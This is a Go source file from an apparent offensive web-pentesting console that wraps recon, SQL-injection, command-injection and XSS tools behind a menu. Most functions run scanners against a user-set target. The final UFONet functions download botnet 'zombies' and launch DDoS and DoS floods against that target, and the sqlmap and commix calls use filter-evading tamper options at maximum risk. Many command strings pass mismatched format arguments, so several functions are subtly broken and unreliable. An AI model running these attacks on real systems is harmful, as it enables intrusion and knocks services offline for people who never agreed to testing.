package webattackers

import (
    "os"
    "fmt"
    "bufio"
    "menus"
    "utils"
    "banners"
    "strings"
    "bcolors"
    "strconv"
    "scriptures"
    "subprocess"
)

var (
    Input string
    Port  string
    Rhost string
    Xhost string
    Yhost string
    Proxy string
    Function string

    scanner  = bufio.NewScanner(os.Stdin)
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
   "proxies": "",
   "rhost": "",
   "rhosts": "",
   "target": "",
   "function": "",
   "wordlist": WordList,
}

type stringMatcher struct {
    names  []string
    action func()
}

func WebsitesPentest() {
    for {
        fmt.Printf("%s%safr3%s websites(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{

        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "clear", "clear screen", "screen clear"}, utils.ClearScreen},

        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutarilas},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        {[]string{"info"}, menus.HelpInfoWebsites},
        {[]string{"m", "menu"}, menus.MenuEight},
        {[]string{"option", "options", "show option", "show options"}, menus.WebsitesOptions},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListWebsitesFunctions},

        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run netmap", "use netmap", "exec netmap", "start netmap", "launch netmap", "exploit netmap", "execute netmap"}, func() { PortScan(Rhost) }},
        {[]string{"? 1", "info 1", "help 1", "netmap", "info netmap", "help netmap"}, menus.HelpInfoPortScan},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run enumscan", "use enumscan", "exec enumscan", "start enumscan", "launch enumscan", "exploit enumscan", "execute enumscan"}, func() { EnumScan(Rhost) }},
        {[]string{"? 2", "info 2", "help 2", "enumscan", "info enumscan", "help enumscan"}, menus.HelpInfoEnumScan},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run dnsrecon", "use dnsrecon", "exec dnsrecon", "start dnsrecon", "launch dnsrecon", "exploit dnsrecon", "execute dnsrecon"}, func() { DnsRecon(Rhost) }},
        {[]string{"? 3", "info 3", "help 3", "dnsrecon", "info dnsrecon", "help dnsrecon"}, menus.HelpInfoDnsRecon},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run techscan", "use techscan", "exec techscan", "start techscan", "launch techscan", "exploit techscan", "execute techscan"}, func() { TechScan(Rhost) }},
        {[]string{"? 4", "info 4", "help 4", "techscan", "info techscan", "help techscan"}, menus.HelpInfoTechScan},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run asetscan", "use asetscan", "exec asetscan", "start asetscan", "launch asetscan", "exploit asetscan", "execute asetscan"}, func() { AssetScan(Rhost) }},
        {[]string{"? 5", "info 5", "help 5", "asetscan", "info asetscan", "help asetscan"}, menus.HelpInfoAsetScan},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run fuzzscan", "use fuzzscan", "exec fuzzscan", "start fuzzscan", "launch fuzzscan", "exploit fuzzscan", "execute fuzzscan"}, func() { FuzzScan(Rhost) }},
        {[]string{"? 6", "info 6", "help 6", "fuzzscan", "info fuzzscan", "help fuzzscan"}, menus.HelpInfoFuzzScan},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run leakscan", "use leakscan", "exec leakscan", "start leakscan", "launch leakscan", "exploit leakscan", "execute leakscan"}, func() { LeakScan(Rhost) }},
        {[]string{"? 7", "info 7", "help 7", "leakscan", "info leakscan", "help leakscan"}, menus.HelpInfoLeakScan},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run vulnscan", "use vulnscan", "exec vulnscan", "start vulnscan", "launch vulnscan", "exploit vulnscan", "execute vulnscan"}, func() { VulnScan(Rhost) }},
        {[]string{"? 8", "info 8", "help 8", "vulnscan", "info vulnscan", "help vulnscan"}, menus.HelpInfoVulnScan},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run bounty", "use bounty", "exec bounty", "start bounty", "launch bounty", "exploit bounty", "execute bounty"}, func() { AutoScan(Rhost) }},
        {[]string{"? 9", "info 9", "help 9", "bounty", "info bounty", "help bounty"}, menus.HelpInfoAutoScan},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

       "rhost": &Rhost,
       "rhosts": &Rhost,
       "target": &Rhost,
       "proxies": &Proxy,
       "func": &Function,
       "module": &Function,
       "function": &Function,
       "wordlist": &WordList,
       "functions": &Function,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

       "rhost": &Rhost,
       "rhosts": &Rhost,
       "target": &Rhost,
       "proxies": &Proxy,
       "func": &Function,
       "module": &Function,
       "function": &Function,
       "wordlist": &WordList,
       "functions": &Function,
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    WebPenFunctions(Function, Rhost)
}

func autoExecuteFunc(distro string, function string) {
    //Distro = distro
    //Function = function
    executeFunction()
}

func formatRhost(Rhost string) {
    prefixes := []string{"http://", "https://", "www."}
    Yhost = Rhost
    for _, prefix := range prefixes {
        Yhost = strings.TrimPrefix(Yhost, prefix)
    }
    Yhost = strings.TrimSpace(Yhost)
    if !strings.HasPrefix(Rhost, "http://") && !strings.HasPrefix(Rhost, "https://") {
        Xhost = "http://" + Rhost
    } else {
        Xhost = Rhost
    }
}

func WebPenFunctions(Function string, args ...interface{}) {
    fmt.Printf("\nRHOST => %s\nFunction => %s\n", Rhost, Function)
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            //
        }
    }

    commands := map[string]func(){
        "netmap": func() {PortScan(Rhost)},
        "enumscan": func() {EnumScan(Rhost)},
        "dnsrecon": func() {DnsRecon(Rhost)},
        "techscan": func() {TechScan(Rhost)},
        "asetscan": func() {AssetScan(Rhost)},
        "fuzzscan": func() {FuzzScan(Rhost)},
        "leakscan": func() {LeakScan(Rhost)},
        "vulnscan": func() {VulnScan(Rhost)},
        "bounty": func() {AutoScan(Rhost)},

        "1": func() {PortScan(Rhost)},
        "2": func() {EnumScan(Rhost)},
        "3": func() {DnsRecon(Rhost)},
        "4": func() {TechScan(Rhost)},
        "5": func() {AssetScan(Rhost)},
        "6": func() {FuzzScan(Rhost)},
        "7": func() {LeakScan(Rhost)},
        "8": func() {VulnScan(Rhost)},
        "9": func() {AutoScan(Rhost)},
    }

    textCommands := []string{"netmap", "enumscan", "dnsrecon", "techscan", "asetscan", "fuzzscan", "leakscan", "vulnscan", "bounty"}

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("\n%s[!] %sNumber %d is invalid. Valid numbers are from 1-10.\n", bcolors.Yellow, bcolors.Endc, num)
        menus.ListWebsitesFunctions()
        return
    }

    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("\n%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListWebsitesFunctions()
}








func EnumScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    for _, cmd := range []string{
        fmt.Sprintf("subfinder -all -d %s -o /root/.afr3/output/subfinder_%s.txt", Rhost, Rhost),
        fmt.Sprintf("amass enum -v -active -brute -d %s -o  /root/.afr3/output/amass_%s.txt", Rhost, Rhost),
    } {
        subprocess.Popen(cmd)
    }
}









func DnsRecon(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming dnsrecon scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("dnsx -l %s; asnmap -d %s; cdncheck -l %s", Rhost, Rhost, Rhost)
}

func PortScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming full port scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("naabu -nmap-cli 'nmap --spoof-mac Cisco -T4 -sV -sC -Pn -v' -host %s", Rhost)
}

func TechScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming tech detection scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`httpx -l %s; aquatone -out %s; httprobe -l %s; gowitness -l %s`, Rhost, Rhost, Rhost, Rhost)
}

func FuzzScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming fuzz scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("dirsearch -l ips_alive --full-url --recursive --exclude-sizes=0B --random-agent -e 7z,archive,ashx,asp,aspx,back,backup,backup-sql,backup.db,backup.sql,bak,bak.zip,bakup,bin,bkp,bson,bz2,core,csv,data,dataset,db,db-backup,db-dump,db.7z,db.bz2,db.gz,db.tar,db.tar.gz,db.zip,dbs.bz2,dll,dmp,dump,dump.7z,dump.db,dump.z,dump.zip,exported,gdb,gdb.dump,gz,gzip,ib,ibd,iso,jar,java,json,jsp,jspf,jspx,ldf,log,lz,lz4,lzh,mongo,neo4j,old,pg.dump,phtm,phtml,psql,rar,rb,rdb,rdb.bz2,rdb.gz,rdb.tar,rdb.tar.gz,rdb.zip,redis,save,sde,sdf,snap,sql,sql.7z,sql.bak,sql.bz2,sql.db,sql.dump,sql.gz,sql.lz,sql.rar,sql.tar.gz,sql.tar.z,sql.xz,sql.z,sql.zip,sqlite,sqlite.bz2,sqlite.gz,sqlite.tar,sqlite.tar.gz,sqlite.zip,sqlite3,sqlitedb,swp,tar,tar.bz2,tar.gz,tar.z,temp,tml,vbk,vhd,war,xhtml,xml,xz,z,zip,conf,config,bak,backup,swp,old,db,sql,asp,aspx~,asp~,py,py~,rb~,php,php~,bkp,cache,cgi,inc,js,json,jsp~,lock,wadl -o output.txt")
}

func LeakScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming leak scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("gitleaks detect -v; trufflehog filesystem --no-update --json; semgrep -l")
}

func AssetScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming asset scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("waybackurls %s; gau %s; urlfinder -l %s; gospider -s %s")
}

func VulnScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...\n", bcolors.Green, bcolors.Endc)
    subprocess.Popen("nuclei -l %s; jaeles -l %s; ffuf -u %s; uncover -l %s; cvemap -l %s; dalfox -b -u %s; qsreplace -l %s")
}

func AutoScan(Rhost string) {
    if Rhost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\n%s[*] %sPerforming auto scan ...\n", bcolors.Green, bcolors.Endc)
}






























func Sublist3r(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/sublist3r/; python3 sublist3r.py -v -d %s`, ToolsDir, Rhost)
}

func Ashock1(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ashok/; python3 ashok.py --headers %s`, ToolsDir, Rhost)
}

func OneForAll(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/oneforall/; python3 oneforall.py --alive True --brute True --port medium --dns True --req True --takeover True --show True run --target %s `, ToolsDir, Rhost)
}

func SeekOlver(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/seekolver/; python3 seekolver.py -v -r -k -cn -p 80 443 -te %s`, ToolsDir, Rhost)
}

func ParamSpider(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming urls mine ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/paramspider/; python3 paramspider.py -s -d %s`, ToolsDir, Rhost)
}

func SslScan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming ssl scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`sslscan --show-certificate --show-sigs --tlsall --verbose %s`, ToolsDir, Rhost)
}

func Gobuster(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming dir recon ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`gobuster dir vhost --debug --no-error --random-agent -w %s/WordList/everything.txt -e -u %s`, ToolsDir, Rhost)
}

func Nuclei(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`nuclei -u %s`, ToolsDir, Rhost)
}

func Nikto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`nikto -ask no -Cgidirs all -Display 3 -host %s`, ToolsDir, Rhost)
}

func Bbot(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 3rd vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`bbot -y -f subdomain-enum email-enum cloud-enum web-basic -m gowitness nuclei --allow-deadly -t %s`, ToolsDir, Rhost)
}

func Uniscan(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 4th vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`uniscan -qweds -u %s`, ToolsDir, Rhost)
}

func SqlmapAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming sql scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -u %s`, ToolsDir, Rhost)
}

func SqlmapMan() {
    fmt.Printf("\n%s[*] %sPerforming man sql scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`sqlmap --tamper=between,luanginx,xforwardedfor --random-agent --threads=10 --level=5 --risk=3 --eta -wizard`)
}

func CommixAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming command scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 -u %s`, ToolsDir, Rhost)
}

func CommixMan() {
    fmt.Printf("\n%s[*] %sPerforming man command scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`commix --all --tamper=between,luanginx,xforwardedfor --random-agent --level=3 --wizard`)
}

func KatanaAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`katana -jc -kf all -c 5 -d 3 %s | httpx -silent -follow-redirects -random-agent -status-code -threads 5 | dalfox pipe --only-poc r --ignore-return 302,404,403 --skip-bav`, ToolsDir, Rhost)
}

func XsserAuto(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming 2nd xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`xsser -c 100 --Cl -u %s`, ToolsDir, Rhost)
}

func XsserMan() {
    fmt.Printf("\n%s[*] %sPerforming man xss scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`xsser -u --wizard`)
}

func NetTacker1(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming recon scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -m port_scan -t 100 -i %s`, ToolsDir, Rhost)
}

func NetTacker2(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming domain scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m subdomain_scan`, ToolsDir, Rhost)
}

func NetTacker3(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming admin finder scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m scan`, ToolsDir, Rhost)
}

func NetTacker4(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming info gathering ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m information_gathering -s`, ToolsDir, Rhost)
    fmt.Println()
}

func NetTacker5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m server_version_vuln`, ToolsDir, Rhost)
}

func NetTacker6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming CVE scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m cve`, ToolsDir, Rhost)
}

func NetTacker7(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s -m high_severity`, ToolsDir, Rhost)
}

func NetTacker8(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming intrusive scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py -i %s --profile all/results.txt`, ToolsDir, Rhost)
}

func NetTacker9() {
    fmt.Printf("\n%s[*] %sLaunched WebUI key: africana ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/nettacker/; python3 nettacker.py --start-api --api-access-key africana`, ToolsDir, Rhost)
}

func Jok3r1() {
    fmt.Printf("\n%s[*] %sInstalling tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; bash install-all.sh`, ToolsDir, Rhost)
}

func Jok3r2() {
    fmt.Printf("\n%s[*] %sUpdating tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py toolbox --update-all --auto`, ToolsDir, Rhost)
}

func Jok3r3() {
    fmt.Printf("\n%s[*] %sShowing tools in the toolbox ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py toolbox --show-all`, ToolsDir, Rhost)
}

func Jok3r4() {
    fmt.Printf("\n%s[*] %sShowing supported products ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py info --services`, ToolsDir, Rhost)
}

func Jok3r5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming avery fast-scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile fast-scan --fast`, ToolsDir, Rhost)
}

func Jok3r6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming security checks on " + bcolors.BrightRed + "\nTarget: " + bcolors.Yellow + "%s \n" + bcolors.Endc, Rhost)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, ToolsDir, Rhost)
}

func Jok3r7(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming critical scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py attack -t %s --profile red-team --fast`, ToolsDir, Rhost)
}

func Jok3r8() {
    fmt.Printf("\n%s[*] %sShowing results & scans ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; xhost +; python3 jok3r.py db creds vulns mission hosts products services report quit; xhost -`)
}

func Jok3r9() {
    fmt.Printf("\n%s[*] %sCleaning results & scans ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/jok3r/; python3 jok3r.py db "mission -d default"`)
}

func Osmedeus1() {
    fmt.Printf("\n%s[*] %sUpdating Osmedeus & Runing diagnostics to checks ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus version --json; osmedeus update; osmedeus update --vuln; osmedeus update --force --clean`)
}

func Osmedeus2(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming simple scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus --nv scan -t %s`, ToolsDir, Rhost)
}

func Osmedeus3(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming dir & vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus --nv scan -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus4(Targe string) {
    fmt.Printf("\n%s[*] %sPerforming bulk scan on " + bcolors.BrightYellow + "Targets " + bcolors.Endc + "= " + bcolors.Green + bcolors.Italic + "%s \n" + bcolors.Endc, Rhost)
    subprocess.Popen(`osmedeus scan -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus5(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming cloud scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus health cloud; osmedeus cloud --chunk -c 5 -t %s`, ToolsDir, Rhost)
}

func Osmedeus6(Rhost string) {
    fmt.Printf("\n%s[*] %sPerforming secret & vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus scan --tactic aggressive --nv -f vuln-and-dirb -t %s`, ToolsDir, Rhost)
}

func Osmedeus7(Rhost string) {
    fmt.Printf("\n%s[*] %sUpdating db before running vuln scan ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus scan --update-vuln -t %s`, ToolsDir, Rhost)
}

func Osmedeus8(Port string) {
    fmt.Printf("\n%s[*] %sStarted Osmedeusweb UI server on " + bcolors.BrightYellow + "localhost:%s%s", Port, bcolors.Endc)
    subprocess.Popen(`osmedeus server --port %s`, Port)
}

func Osmedeus9() {
    fmt.Printf("\n%s[*] %sShowing scanned osmedeus report list ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`osmedeus report list`)
}

func Ufonet1() {
    fmt.Printf("\n%s[*] %sDownloading list of bots from C.S ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet --download-zombies`)
}

func Ufonet2() {
    fmt.Printf("\n%s[*] %sTesting If all bots are alive & ready to launch ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -t botnet/zombies.txt`)
}

func Ufonet3(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Palantir 3.14 ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet4(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched Socking_waves(instant-knockout!) ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --nuke "10000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet5(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched xcom-1(only DDoS) ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --spray "1000" --smurf "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" -a "%s"`, ToolsDir, Rhost)
}

func Ufonet6(Rhost string) {
    fmt.Printf("\n%s[*] %sLaunched xcom-2(only DoS) ...", bcolors.Green, bcolors.Endc)
    subprocess.Popen(`cd %s/websites/ufonet/; python3 ufonet -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" -a "%s"`, ToolsDir, Rhost)
}

